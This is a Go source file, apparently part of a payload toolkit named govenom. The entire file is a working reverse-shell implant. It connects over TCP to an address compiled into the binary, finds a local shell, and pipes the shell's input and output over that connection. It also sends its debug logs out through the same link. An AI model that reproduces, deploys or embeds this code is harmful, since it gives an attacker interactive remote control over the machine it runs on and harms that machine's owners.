package main

import (
	"fmt"
	"govenom/debuglog"
	"net"
	"os/exec"
)

var (
	// set during compilation/linking via -X ldflag
	address      string
	debugCfg     string
	noWindowsGui string
	shellBinary  string
)

func determineShellBinary(candidates []string) (string, error) {
	candidates = append([]string{shellBinary}, candidates...)
	for _, candidate := range candidates {
		binary, err := exec.LookPath(candidate)
		if err != nil {
			continue
		}
		return binary, nil
	}
	return "", fmt.Errorf("could not find any existing shell binary")
}

func attachShell(binaryPath string, con net.Conn) error {
	var cmd *exec.Cmd
	cmd = exec.Command(binaryPath, "-i")
	cmd.SysProcAttr = getSysProcAttr()
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	err := cmd.Start()
	if err != nil {
		return fmt.Errorf("could not start shell: %v", err)
	}
	err = cmd.Wait()
	if err != nil {
		return fmt.Errorf("shell died: %v", err)
	}
	return nil
}

func main() {
	log, errs := debuglog.New(debugCfg)

	con, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal(err)
	}

	log.AddExfiltrator(con)
	// send out debuglog configuration errors *at least* over TCP
	if len(errs) > 0 {
		for _, err := range errs {
			log.Fatal(err)
		}
	}

	binaryPath, err := determineShellBinary(getShellBinaries())
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("Using Shell: %s\n", binaryPath)

	err = attachShell(binaryPath, con)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Shell terminated")
}
